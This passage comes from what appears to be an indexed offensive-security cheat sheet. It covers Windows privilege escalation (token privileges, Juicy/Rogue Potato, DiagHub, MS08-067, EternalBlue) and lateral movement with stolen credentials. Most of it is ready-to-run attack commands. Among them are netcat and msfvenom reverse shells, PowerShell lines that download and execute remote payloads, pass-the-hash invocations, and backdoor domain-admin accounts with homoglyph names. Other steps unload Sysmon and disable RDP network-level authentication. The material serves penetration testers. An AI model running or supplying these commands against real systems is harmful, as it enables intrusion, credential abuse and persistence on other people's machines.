the update. I will try to re-phrase it to something more recipe-like soon. SeBackup Threat Built-in commands Read sensitve files with robocopy /b - May be more interesting if you can read %WINDIR%\\MEMORY.DMP - SeBackupPrivilege (and robocopy) is not helpful when it comes to open files. - Robocopy requires both SeBackup and SeRestore to work with /b parameter. SeCreateToken Admin 3rd party tool Create arbitrary token including local admin rights with NtCreateToken . SeDebug Admin PowerShell Duplicate the lsass.exe token. Script to be found at FuzzySecurity SeLoadDriver Admin 3rd party tool 1. Load buggy kernel driver such as szkg64.sys or capcom.sys 2. Exploit the driver vulnerability Alternatively, the privilege may be used to unload security-related drivers with ftlMC builtin command. i.e.: fltMC sysmondrv 1. The szkg64 vulnerability is listed as CVE-2018-15732 2. The szkg64 exploit code was created by Parvez Anwar SeRestore Admin PowerShell 1. Launch PowerShell/ISE with the SeRestore privilege present. 2. Enable the privilege with Enable-SeRestorePrivilege ). 3. Rename utilman.exe to utilman.old 4. Rename cmd.exe to utilman.exe 5. Lock the console and press Win+U Attack may be detected by some AV software. Alternative method relies on replacing service binaries stored in \"Program Files\" using the same privilege. SeTakeOwnership Admin Built-in commands 1. takeown.exe /f \"%windir%\\system32\" 2. icalcs.exe \"%windir%\\system32\" /grant \"%username%\":F 3. Rename cmd.exe to utilman.exe 4. Lock the console and press Win+U Attack may be detected by some AV software. Alternative method relies on replacing service binaries stored in \"Program Files\" using the same privilege. SeTcb Admin 3rd party tool Manipulate tokens to have local admin rights included. May require SeImpersonate. To be verified.","title":"EoP - Impersonation Privileges"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#restore-a-service-accounts-privileges","text":"This tool should be executed as LOCAL SERVICE or NETWORK SERVICE only. # https://github.com/itm4n/FullPowers c:\\TOOLS>FullPowers [+] Started dummy thread with id 9976 [+] Successfully created scheduled task. [+] Got new token! Privilege count: 7 [+] CreateProcessAsUser() OK Microsoft Windows [Version 10.0.19041.84] (c) 2019 Microsoft Corporation. All rights reserved. C:\\WINDOWS\\system32>whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ========================================= ======= SeAssignPrimaryTokenPrivilege Replace a process level token Enabled SeIncreaseQuotaPrivilege Adjust memory quotas for a process Enabled SeAuditPrivilege Generate security audits Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled c:\\TOOLS>FullPowers -c \"C:\\TOOLS\\nc64.exe 1.2.3.4 1337 -e cmd\" -z","title":"Restore A Service Account's Privileges"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#meterpreter-getsystem-and-alternatives","text":"meterpreter> getsystem Tokenvator.exe getsystem cmd.exe incognito.exe execute -c \"NT AUTHORITY\\SYSTEM\" cmd.exe psexec -s -i cmd.exe python getsystem.py # from https://github.com/sailay1996/tokenx_privEsc","title":"Meterpreter getsystem and alternatives"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#rottenpotato-token-impersonation","text":"Binary available at : https://github.com/foxglovesec/RottenPotato Binary available at : https://github.com/breenmachine/RottenPotatoNG getuid getprivs use incognito list\\_tokens -u cd c:\\temp\\ execute -Hc -f ./rot.exe impersonate\\_token \"NT AUTHORITY\\SYSTEM\" Invoke-TokenManipulation -ImpersonateUser -Username \"lab\\domainadminuser\" Invoke-TokenManipulation -ImpersonateUser -Username \"NT AUTHORITY\\SYSTEM\" Get-Process wininit | Invoke-TokenManipulation -CreateProcess \"Powershell.exe -nop -exec bypass -c \\\"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\\\"};\"","title":"RottenPotato (Token Impersonation)"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#juicy-potato-abusing-the-golden-privileges","text":"If the machine is >= Windows 10 1809 & Windows Server 2019 - Try Rogue Potato If the machine is < Windows 10 1809 < Windows Server 2019 - Try Juicy Potato Binary available at : https://github.com/ohpe/juicy-potato/releases Check the privileges of the service account, you should look for SeImpersonate and/or SeAssignPrimaryToken (Impersonate a client after authentication) powershell whoami /priv Select a CLSID based on your Windows version, a CLSID is a globally unique identifier that identifies a COM class object Windows 7 Enterprise Windows 8.1 Enterprise Windows 10 Enterprise Windows 10 Professional Windows Server 2008 R2 Enterprise Windows Server 2012 Datacenter Windows Server 2016 Standard Execute JuicyPotato to run a privileged command. powershell JuicyPotato.exe -l 9999 -p c:\\interpub\\wwwroot\\upload\\nc.exe -a \"IP PORT -e cmd.exe\" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7} JuicyPotato.exe -l 1340 -p C:\\users\\User\\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334} JuicyPotato.exe -l 1337 -p c:\\Windows\\System32\\cmd.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -a \"/c c:\\users\\User\\reverse_shell.exe\" Testing {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} 1337 ...... [+] authresult 0 {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\\SYSTEM [+] CreateProcessWithTokenW OK","title":"Juicy Potato (Abusing the golden privileges)"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#rogue-potato-fake-oxid-resolver","text":"Binary available at https://github.com/antonioCoco/RoguePotato # Network redirector / port forwarder to run on your remote machine, must use port 135 as src port socat tcp-listen:135,reuseaddr,fork tcp:10.0.0.3:9999 # RoguePotato without running RogueOxidResolver locally. You should run the RogueOxidResolver.exe on your remote machine. # Use this if you have fw restrictions. RoguePotato.exe -r 10.0.0.3 -e \"C:\\windows\\system32\\cmd.exe\" # RoguePotato all in one with RogueOxidResolver running locally on port 9999 RoguePotato.exe -r 10.0.0.3 -e \"C:\\windows\\system32\\cmd.exe\" -l 9999 #RoguePotato all in one with RogueOxidResolver running locally on port 9999 and specific clsid and custom pipename RoguePotato.exe -r 10.0.0.3 -e \"C:\\windows\\system32\\cmd.exe\" -l 9999 -c \"{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}\" -p splintercode","title":"Rogue Potato (Fake OXID Resolver)"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#efspotato-ms-efsr-efsrpcopenfileraw","text":"Binary available at https://github.com/zcgonvh/EfsPotato # .NET 4.x csc EfsPotato.cs csc /platform:x86 EfsPotato.cs # .NET 2.0/3.5 C:\\Windows\\Microsoft.Net\\Framework\\V3.5\\csc.exe EfsPotato.cs C:\\Windows\\Microsoft.Net\\Framework\\V3.5\\csc.exe /platform:x86 EfsPotato.cs","title":"EFSPotato (MS-EFSR EfsRpcOpenFileRaw)"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#eop-privileged-file-write","text":"","title":"EoP - Privileged File Write"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#diaghub","text":":warning: Starting with version 1903 and above, DiagHub can no longer be used to load arbitrary DLLs. The Microsoft Diagnostics Hub Standard Collector Service (DiagHub) is a service that collects trace information and is programmatically exposed via DCOM. This DCOM object can be used to load a DLL into a SYSTEM process, provided that this DLL exists in the C:\\Windows\\System32 directory.","title":"DiagHub"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#exploit","text":"Create an evil DLL e.g: payload.dll and move it into C:\\Windows\\System32 Build https://github.com/xct/diaghub diaghub.exe c:\\\\ProgramData\\\\ payload.dll The default payload will run C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe -lvp 2000 -e cmd.exe Alternative tools: * https://github.com/Accenture/AARO-Bugs/tree/master/CVE-2020-5825/TrigDiag * https://github.com/decoder-it/diaghub_exploit","title":"Exploit"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#usodllloader","text":":warning: 2020-06-06 Update: this trick no longer works on the latest builds of Windows 10 Insider Preview. An alternative to the DiagHub DLL loading \"exploit\" found by James Forshaw (a.k.a. @tiraniddo) If we found a privileged file write vulnerability in Windows or in some third-party software, we could copy our own version of windowscoredeviceinfo.dll into C:\\Windows\\Sytem32\\ and then have it loaded by the USO service to get arbitrary code execution as NT AUTHORITY\\System .","title":"UsoDLLLoader"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#exploit_1","text":"Build https://github.com/itm4n/UsoDllLoader Select Release config and x64 architecure. Build solution. DLL .\\x64\\Release\\WindowsCoreDeviceInfo.dll Loader .\\x64\\Release\\UsoDllLoader.exe. Copy WindowsCoreDeviceInfo.dll to C:\\Windows\\System32\\ Use the loader and wait for the shell or run usoclient StartInteractiveScan and connect to the bind shell on port 1337.","title":"Exploit"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#wertrigger","text":"Weaponizing for privileged file writes bugs with Windows problem reporting Clone https://github.com/sailay1996/WerTrigger Copy phoneinfo.dll to C:\\Windows\\System32\\ Place Report.wer file and WerTrigger.exe in a same directory. Then, run WerTrigger.exe . Enjoy a shell as NT AUTHORITY\\SYSTEM","title":"WerTrigger"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#eop-common-vulnerabilities-and-exposure","text":"","title":"EoP - Common Vulnerabilities and Exposure"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#ms08-067-netapi","text":"Check the vulnerability with the following nmap script. nmap -Pn -p445\u200a--open\u200a--max-hostgroup 3\u200a--script smb-vuln-ms08-067 <ip_netblock> Metasploit modules to exploit MS08-067 NetAPI . exploit/windows/smb/ms08_067_netapi If you can't use Metasploit and only want a reverse shell. https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -b \"\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40\" -f py -v shellcode -a x86 --platform windows Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445 Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used) Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX) Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX) Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX) python ms08-067.py 10.0.0.1 6 445","title":"MS08-067 (NetAPI)"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#ms10-015-kitrap0d-microsoft-windows-nt200020032008xpvista7","text":"'KiTrap0D' User Mode to Ring Escalation (MS10-015) https://www.exploit-db.com/exploits/11199 Metasploit : exploit/windows/local/ms10_015_kitrap0d","title":"MS10-015 (KiTrap0D) - Microsoft Windows NT/2000/2003/2008/XP/Vista/7"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#ms11-080-afdsys-microsoft-windows-xp2003","text":"Python: https://www.exploit-db.com/exploits/18176 Metasploit: exploit/windows/local/ms11_080_afdjoinleaf","title":"MS11-080 (afd.sys) - Microsoft Windows XP/2003"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#ms15-051-client-copy-image-microsoft-windows-20032008782012","text":"printf(\"[#] usage: ms15-051 command \\n\"); printf(\"[#] eg: ms15-051 \\\"whoami /all\\\" \\n\"); # x32 https://github.com/rootphantomer/exp/raw/master/ms15-051%EF%BC%88%E4%BF%AE%E6%94%B9%E7%89%88%EF%BC%89/ms15-051/ms15-051/Win32/ms15-051.exe # x64 https://github.com/rootphantomer/exp/raw/master/ms15-051%EF%BC%88%E4%BF%AE%E6%94%B9%E7%89%88%EF%BC%89/ms15-051/ms15-051/x64/ms15-051.exe https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051 use exploit/windows/local/ms15_051_client_copy_image","title":"MS15-051 (Client Copy Image) - Microsoft Windows 2003/2008/7/8/2012"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#ms16-032-microsoft-windows-7-10-2008-2012-r2-x86x64","text":"Check if the patch is installed : wmic qfe list | findstr \"3139914\" Powershell: https://www.exploit-db.com/exploits/39719/ https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1 Binary exe : https://github.com/Meatballs1/ms16-032 Metasploit : exploit/windows/local/ms16_032_secondary_logon_handle_privesc","title":"MS16-032 - Microsoft Windows 7 &lt; 10 / 2008 &lt; 2012 R2 (x86/x64)"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#ms17-010-eternal-blue","text":"Check the vulnerability with the following nmap script or crackmapexec: crackmapexec smb 10.10.10.10 -u '' -p '' -d domain -M ms17-010 . nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17\u2013010 <ip_netblock> Metasploit modules to exploit EternalRomance/EternalSynergy/EternalChampion . auxiliary/admin/smb/ms17_010_command MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution auxiliary/scanner/smb/smb_ms17_010 MS17-010 SMB RCE Detection exploit/windows/smb/ms17_010_eternalblue MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption exploit/windows/smb/ms17_010_eternalblue_win8 MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+ exploit/windows/smb/ms17_010_psexec MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution If you can't use Metasploit and only want a reverse shell. git clone https://github.com/helviojunior/MS17-010 # generate a simple reverse shell to use msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o revshell.exe python2 send_and_execute.py 10.0.0.1 revshell.exe","title":"MS17-010 (Eternal Blue)"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#cve-2019-1388","text":"Exploit : https://packetstormsecurity.com/files/14437/hhupd.exe.html Requirement: - Windows 7 - Windows 10 LTSC 10240 Failing on : - LTSC 2019 - 1709 - 1803 Detailed information about the vulnerability : https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege","title":"CVE-2019-1388"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#references","text":"Windows Internals Book - 02/07/2017 icacls - Docs Microsoft Privilege Escalation Windows - Philip Linghammar Windows elevation of privileges - Guifre Ruiz The Open Source Windows Privilege Escalation Cheat Sheet by amAK.xyz and @xxByte Basic Linux Privilege Escalation Windows Privilege Escalation Fundamentals TOP\u201310 ways to boost your privileges in Windows systems - hackmag The SYSTEM Challenge Windows Privilege Escalation Guide - absolomb's security blog Chapter 4 - Windows Post-Exploitation - 2 Nov 2017 - dostoevskylabs Remediation for Microsoft Windows Unquoted Service Path Enumeration Vulnerability - September 18th, 2016 - Robert Russell Pentestlab.blog - WPE-01 - Stored Credentials Pentestlab.blog - WPE-02 - Windows Kernel Pentestlab.blog - WPE-03 - DLL Injection Pentestlab.blog - WPE-04 - Weak Service Permissions Pentestlab.blog - WPE-05 - DLL Hijacking Pentestlab.blog - WPE-06 - Hot Potato Pentestlab.blog - WPE-07 - Group Policy Preferences Pentestlab.blog - WPE-08 - Unquoted Service Path Pentestlab.blog - WPE-09 - Always Install Elevated Pentestlab.blog - WPE-10 - Token Manipulation Pentestlab.blog - WPE-11 - Secondary Logon Handle Pentestlab.blog - WPE-12 - Insecure Registry Permissions Pentestlab.blog - WPE-13 - Intel SYSRET Alternative methods of becoming SYSTEM - 20th November 2017 - Adam Chester @ xpn Living Off The Land Binaries and Scripts (and now also Libraries) Common Windows Misconfiguration: Services - 2018-09-23 - @am0nsec Local Privilege Escalation Workshop - Slides.pdf - @sagishahar Abusing Diaghub - xct - March 07, 2019 Windows Exploitation Tricks: Exploiting Arbitrary File Writes for Local Elevation of Privilege - James Forshaw, Project Zero - Wednesday, April 18, 2018 Weaponizing Privileged File Writes with the USO Service - Part 2/2 - itm4n - August 19, 2019 Hacking Trick: Environment Variable $Path Interception y Escaladas de Privilegios para Windows Abusing SeLoadDriverPrivilege for privilege escalation - 14 - JUN - 2018 - OSCAR MALLO Universal Privilege Escalation and Persistence \u2013 Printer - AUGUST 2, 2021)","title":"References"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/","text":"Windows - Using credentials Summary TIPS TIP 1 - Create your credential TIP 2 - Retail Credential TIP 3 - Sandbox Credential - WDAGUtilityAccount Metasploit Metasploit - SMB Metasploit - Psexec Remote Code Execution with PS Credentials WinRM Powershell Remoting Crackmapexec Winexe WMI Psexec.py / Smbexec.py / Wmiexec.py PsExec - Sysinternal RDP Remote Desktop Protocol Netuse Runas Pass the Ticket SSH TIPS TIP 1 - Create your credential net user hacker Hcker_12345678* /add /Y net localgroup administrators hacker /add net localgroup \"Remote Desktop Users\" hacker /add # RDP access net localgroup \"Backup Operators\" hacker /add # Full access to files net group \"Domain Admins\" hacker /add /domain # enable a domain user account net user hacker /ACTIVE:YES /domain # prevent users from changing their password net user username /Passwordchg:No # prevent the password to expire net user hacker /Expires:Never # create a machine account (not shown in net users) net user /add evilbob$ evilpassword # homoglyph A\u0501m\u0456nistrat\u03bfr (different of Administrator) A\u0501m\u0456nistrat\u03bfr Some info about your user net user /dom net user /domain TIP 2 - Retail Credential Retail Credential @m8urnett on Twitter when you run Windows in retail demo mode, it creates a user named Darrin DeYoung and an admin RetailAdmin Username: RetailAdmin Password: trs10 TIP 3 - Sandbox Credential - WDAGUtilityAccount WDAGUtilityAccount - @never_released on Twitter Starting with Windows 10 version 1709 (Fall Creators Update), it is part of Windows Defender Application Guard \\\\windowssandbox Username: wdagutilityaccount Password: pw123 Metasploit Metasploit - SMB use auxiliary/scanner/smb/smb_login set SMBDomain DOMAIN set SMBUser username set SMBPass password services -p 445 -R run creds Metasploit - Psexec Note: the password can be replaced by a hash to execute a pass the hash attack. use exploit/windows/smb/psexec set RHOST 10.2.0.3 set SMBUser username set SMBPass password set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c set PAYLOAD windows/meterpreter/bind_tcp run shell Crackmapexec root@payload$ git clone https://github.com/byt3bl33d3r/CrackMapExec.github root@payload$ cme smb 192.168.1.100 -u Administrator -H \":5858d47a41e40b40f294b3100bea611f\" -x 'whoami' # cmd root@payload$ cme smb 192.168.1.100 -u Administrator -H \":5858d47a41e40b40f294b3100bea611f\" -X 'whoami' # powershell root@payload$ cme smb 192.168.1.100 -u Administrator -H \":5858d47a41e40b40f294b3100bea611f\" --exec-method atexec -x 'whoami' root@payload$ cme smb 192.168.1.100 -u Administrator -H \":5858d47a41e40b40f294b3100bea611f\" --exec-method wmiexec -x 'whoami' root@payload$ cme smb 192.168.1.100 -u Administrator -H \":5858d47a41e40b40f294b3100bea611f\" --exec-method smbexec -x 'whoami' Remote Code Execution with PS Credentials PS C:\\> $SecPassword = ConvertTo-SecureString 'secretpassword' -AsPlainText -Force PS C:\\> $Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\\USERNAME', $SecPassword) PS C:\\> Invoke-Command -ComputerName DC01 -Credential $Cred -ScriptBlock {whoami} PS C:\\> New-PSSESSION -NAME PSDC -ComputerName COMPUTER01; Invoke-Command -ComputerName COMPUTER01 -ScriptBlock {whoami} PS C:\\> Invoke-Command -ComputerName COMPUTER01 -ScriptBlock {powershell Invoke-WebRequest -Uri 'http://10.10.10.10/beacon.exe' -OutFile 'C:\\Temp\\beacon.exe'; Start-Process -wait C:\\Temp\\beacon.exe} WinRM Require: * Port 5985 or 5986 open. * Default endpoint is /wsman root@payload$ git clone https://github.com/Hackplayers/evil-winrm root@payload$ evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] root@payload$ ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/' root@payload$ ruby evil-winrm.rb -i 10.0.0.20 -u username -H BD1C6503987F8FF006296118F359FA79 root@payload$ ruby evil-winrm.rb -i 10.0.0.20 -u username -p password -r domain.local *Evil-WinRM* PS > Bypass-4MSI *Evil-WinRM* PS > IEX([Net.Webclient]::new().DownloadString(\"http://127.0.0.1/PowerView.ps1\")) or using a custom ruby code to interact with the WinRM service. require 'winrm' conn = WinRM::Connection.new( endpoint: 'http://ip:5985/wsman', user: 'domain/user', password: 'password', ) command=\"\" conn.shell(:powershell) do |shell| until command == \"exit\\n\" do print \"PS > \" command = gets output = shell.run(command) do |stdout, stderr| STDOUT.print stdout STDERR.print stderr end end puts \"Exiting with code #{output.exitcode}\" end Powershell Remoting PSSESSION PS> Enable-PSRemoting # use credential PS> $pass = ConvertTo-SecureString 'supersecurepassword' -AsPlainText -Force PS> $cred = New-Object System.Management.Automation.PSCredential ('DOMAIN\\Username', $pass) PS> Invoke-Command -ComputerName DC -Credential $cred -ScriptBlock { whoami } # one-to-one interactive session PS> Enter-PSSession -computerName DC01 [DC01]: PS> # one-to-one execute scripts and commands PS> $Session = New-PSSession -ComputerName CLIENT1 PS> Invoke-Command -Session $Session -scriptBlock { $test = 1 } PS> Invoke-Command -Session $Session -scriptBlock { $test } 1 # one-to-many execute scripts and commands PS> Invoke-Command -computername DC01,CLIENT1 -scriptBlock { Get-Service } PS> Invoke-Command -computername DC01,CLIENT1 -filePath c:\\Scripts\\Task.ps1 Winexe Integrated to Kali root@payload$ winexe -U DOMAIN/username%password //10.10.10.10 cmd.exe WMI PS C:\\> wmic /node:target.domain /user:domain\\user /password:password process call create \"C:\\Windows\\System32\\calc.exe\u201d Psexec.py / Smbexec.py / Wmiexec.py From Impacket (:warning: renamed to impacket-xxx in Kali) :warning: get / put for wmiexec, psexec, smbexec, and dcomexec are changing to lget and lput . :warning: French characters might not be correctly displayed on your output, use -codec ibm850 to fix this. root@payload$ git clone https://github.com/CoreSecurity/impacket.git # PSEXEC like functionality example using RemComSv root@payload$ python psexec.py DOMAIN/username:password@10.10.10.10 # this will drop a binary on the disk = noisy # A similar approach to PSEXEC w/o using RemComSvc root@payload$ python smbexec.py DOMAIN/username:password@10.10.10.10 # A semi-interactive shell, used through Windows Management Instrumentation. root@payload$ python wmiexec.py DOMAIN/username:password@10.10.10.10 root@payload$ wmiexec.py domain.local/user@10.0.0.20 -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79 # A semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints. root@payload$ python atexec.py DOMAIN/username:password@10.10.10.10 # Executes a command on the target machine through the Task Scheduler service and returns the output of the executed command. root@payload$ python dcomexec.py DOMAIN/username:password@10.10.10.10 PsExec - Sysinternal from Windows - Sysinternal PS C:\\> PsExec.exe \\\\ordws01.cscou.lab -u DOMAIN\\username -p password cmd.exe # switch admin user to NT Authority/System PS C:\\> PsExec.exe \\\\ordws01.cscou.lab -u DOMAIN\\username -p password cmd.exe -s RDP Remote Desktop Protocol :warning: NOTE : You may need to enable RDP and disable NLA and fix CredSSP errors. # Enable RDP PS C:\\> reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0x00000000 /f PS C:\\> netsh firewall set service remoteadmin enable PS C:\\> netsh firewall set service remotedesktop enable # Alternative C:\\> psexec \\\\machinename reg add \"hklm\\system\\currentcontrolset\\control\\terminal server\" /f /v fDenyTSConnections /t REG_DWORD /d 0 root@payload$ crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable # Fix CredSSP errors reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 /f # Disable NLA PS > (Get-WmiObject -class \"Win32_TSGeneralSetting\" -Namespace root\\cimv2\\terminalservices -ComputerName \"PC01\" -Filter \"TerminalName='RDP-tcp'\").UserAuthenticationRequired PS > (Get-WmiObject -class \"Win32_TSGeneralSetting\" -Namespace root\\cimv2\\terminalservices -ComputerName \"PC01\" -Filter \"TerminalName='RDP-tcp'\").SetUserAuthenticationRequired(0) Abuse RDP protocol to execute commands remotely with the following commands; rdesktop powershell root@payload$ rdesktop -d DOMAIN -u username -p password 10.10.10.10 -g 70 -r disk:share=/home/user/myshare root@payload$ rdesktop -u username -p password -g 70% -r disk:share=/tmp/myshare 10.10.10.10 # -g : the screen will take up 70% of your actual screen size # -r disk:share : sharing a local folder during a remote desktop session freerdp ```powershell root@payload$ xfreerdp /v:10.0.0.1 /u:'Username' /p:'Password123!' +clipboard /cert-ignore /size:1366x768 /smart-sizing root@payload$ xfreerdp /v:10.0.0.1 /u:username # password will be asked pass the hash using Restricted Admin, need an admin account not in the \"Remote Desktop Users\" group. pass the hash works for Server 2012 R2 / Win 8.1+ require freerdp2-x11 freerdp2-shadow-x11 packages instead of freerdp-x11 root@payload$ xfreerdp /v:10.0.0.1 /u:username /d:domain /pth:88a405e17c0aa5debbc9b5679753939d * [SharpRDP](https://github.com/0xthirteen/SharpRDP) powershell PS C:> SharpRDP.exe computername=target.domain command=\"C:\\Temp\\file.exe\" username=domain\\user password=password ``` Netuse Windows only PS C:\\> net use \\\\ordws01.cscou.lab /user:DOMAIN\\username password C$ Runas PS C:\\> runas /netonly /user:DOMAIN\\username \"cmd.exe\" PS C:\\> runas /noprofil /netonly /user:DOMAIN\\username cmd.exe Pass the Ticket python3 getTGT.py -hashes aad3b435b51404eeaad3b435b51404ee:B65039D1C0359FA797F88FF06296118F domain.local/user [*] Saving ticket in user.ccache cp user.ccache /tmp/krb5cc_0 export KRB5CCNAME=/tmp/krb5cc_0 klist SSH :warning: You cannot pass the hash to SSH, but you can connect with a Kerberos ticket (Which you can get by passing the hash!) cp user.ccache /tmp/krb5cc_1045 ssh -o GSSAPIAuthentication=yes user@domain.local -vv References Ropnop - Using credentials to own Windows boxes Ropnop - Using credentials to own Windows boxes Part 2 Gaining Domain Admin from Outside Active Directory","title":"Windows - Using credentials"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#windows-using-credentials","text":"","title":"Windows - Using credentials"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#summary","text":"TIPS TIP 1 - Create your credential TIP 2 - Retail Credential TIP 3 - Sandbox Credential - WDAGUtilityAccount Metasploit Metasploit - SMB Metasploit - Psexec Remote Code Execution with PS Credentials WinRM Powershell Remoting Crackmapexec Winexe WMI Psexec.py / Smbexec.py / Wmiexec.py PsExec - Sysinternal RDP Remote Desktop Protocol Netuse Runas Pass the Ticket SSH","title":"Summary"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#tips","text":"","title":"TIPS"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#tip-1-create-your-credential","text":"net user hacker Hcker_12345678* /add /Y net localgroup administrators hacker /add net localgroup \"Remote Desktop Users\" hacker /add # RDP access net localgroup \"Backup Operators\" hacker /add # Full access to files net group \"Domain Admins\" hacker /add /domain # enable a domain user account net user hacker /ACTIVE:YES /domain # prevent users from changing their password net user username /Passwordchg:No # prevent the password to expire net user hacker /Expires:Never # create a machine account (not shown in net users) net user /add evilbob$ evilpassword # homoglyph A\u0501m\u0456nistrat\u03bfr (different of Administrator) A\u0501m\u0456nistrat\u03bfr Some info about your user net user /dom net user /domain","title":"TIP 1 - Create your credential"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#tip-2-retail-credential","text":"Retail Credential @m8urnett on Twitter when you run Windows in retail demo mode, it creates a user named Darrin DeYoung and an admin RetailAdmin Username: RetailAdmin Password: trs10","title":"TIP 2 - Retail Credential"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#tip-3-sandbox-credential-wdagutilityaccount","text":"WDAGUtilityAccount - @never_released on Twitter Starting with Windows 10 version 1709 (Fall Creators Update), it is part of Windows Defender Application Guard \\\\windowssandbox Username: wdagutilityaccount Password: pw123","title":"TIP 3 - Sandbox Credential - WDAGUtilityAccount"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#metasploit","text":"","title":"Metasploit"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#metasploit-smb","text":"use auxiliary/scanner/smb/smb_login set SMBDomain DOMAIN set SMBUser username set SMBPass password services -p 445 -R run creds","title":"Metasploit - SMB"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#metasploit-psexec","text":"Note: the password can be replaced by a hash to execute a pass the hash attack. use exploit/windows/smb/psexec set RHOST 10.2.0.3 set SMBUser username set SMBPass password set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c set PAYLOAD windows/meterpreter/bind_tcp run shell","title":"Metasploit - Psexec"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#crackmapexec","text":"root@payload$ git clone https://github.com/byt3bl33d3r/CrackMapExec.github root@payload$ cme smb 192.168.1.100 -u Administrator -H 